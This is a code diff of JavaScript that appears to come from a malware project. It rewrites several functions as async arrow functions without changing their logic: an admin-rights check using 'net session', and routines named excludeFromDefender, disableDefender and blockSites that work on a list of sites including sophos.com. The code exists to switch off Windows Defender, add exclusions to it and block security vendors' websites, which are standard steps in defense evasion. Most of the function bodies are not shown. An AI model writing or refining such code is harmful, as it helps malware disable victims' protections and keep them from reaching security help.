@@ -34,7 +34,7 @@ const sites = [
     "sophos.com",
 ];
 
-function isElevated() {
+const isElevated = async () => {
     return new Promise((resolve) => {
         exec('net session', (err) => {
             resolve(!err);
@@ -42,7 +42,7 @@ function isElevated() {
     });
 }
 
-async function excludeFromDefender() {
+const excludeFromDefender = async () => {
     if (!(await isElevated())) {
         throw new Error('Not elevated');
     }
@@ -60,7 +60,7 @@ async function excludeFromDefender() {
     });
 }
 
-async function disableDefender() {
+const disableDefender = async () => {
     if (!(await isElevated())) {
         throw new Error('Not elevated');
     }
@@ -89,7 +89,7 @@ async function disableDefender() {
     });
 }
 
-async function blockSites(sites) {
+const blockSites = async (sites) => {
     if (!(await isElevated())) {
         throw new Error('Not elevated');
     }
